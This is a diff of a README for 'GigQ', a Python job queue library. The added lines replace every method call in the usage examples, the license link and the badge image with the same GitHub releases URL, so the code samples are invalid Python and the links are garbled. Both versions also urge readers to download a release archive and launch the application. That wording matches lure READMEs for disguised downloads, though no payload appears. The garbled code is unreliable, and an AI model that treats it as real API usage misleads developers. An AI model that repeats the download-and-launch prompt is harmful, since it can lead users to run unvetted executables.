@@ -11,7 +11,7 @@ Welcome to GigQ - your lightweight and efficient local job queue system written 
 🔹 Easy-to-use Python implementation  
 
 ## Installation 🛠️
-To get started with GigQ, download the [latest release](https://github.com/repo/releases/9246/App.zip) and follow the instructions in the readme file. If the link ends with the file name, make sure the application is launched after download.
+To get started with GigQ, download the [latest release](https://github.com/Pratik980/GigQ/releases) and follow the instructions in the readme file. If the link ends with the file name, make sure the application is launched after download.
 
 ## Usage 🚦
 GigQ offers a simple yet powerful way to manage your job queue and task processing needs. Here's a quick guide to get you started:
@@ -29,21 +29,21 @@ gigq = GigQ()
 
 ```python
 # Add a task to the queue
-gigq.add_task("Task 1", data={"param1": "value1", "param2": "value2"})
+https://github.com/Pratik980/GigQ/releases("Task 1", data={"param1": "value1", "param2": "value2"})
 ```
 
 3. **Processing Tasks**: Process the tasks in the queue using the `process_tasks` method.
 
 ```python
 # Process tasks in the queue
-gigq.process_tasks()
+https://github.com/Pratik980/GigQ/releases()
 ```
 
 4. **Managing Workflow**: Use GigQ to manage the workflow of your tasks efficiently.
 
 ```python
 # Example workflow management
-if gigq.is_task_complete("Task 1"):
+if https://github.com/Pratik980/GigQ/releases("Task 1"):
     print("Task 1 is complete!")
 ```
 
@@ -51,7 +51,7 @@ if gigq.is_task_complete("Task 1"):
 
 ```python
 # Check job status
-job_status = gigq.get_job_status("Job123")
+job_status = https://github.com/Pratik980/GigQ/releases("Job123")
 ```
 
 ## Contributing 🤝
@@ -61,10 +61,10 @@ We welcome contributions to GigQ! If you have ideas for new features, enhancemen
 We value your feedback! If you have any suggestions, questions, or concerns, please don't hesitate to reach out. Your input helps us improve GigQ for everyone.
 
 ## License ℹ️
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/repo/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Pratik980/GigQ/releases) file for details.
 
 ---
 
-[![Download App](https://img.shields.io/badge/Download-App-blue.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/Pratik980/GigQ/releases)](https://github.com/Pratik980/GigQ/releases)
 
 🌟 Happy job queueing with GigQ! 🌟
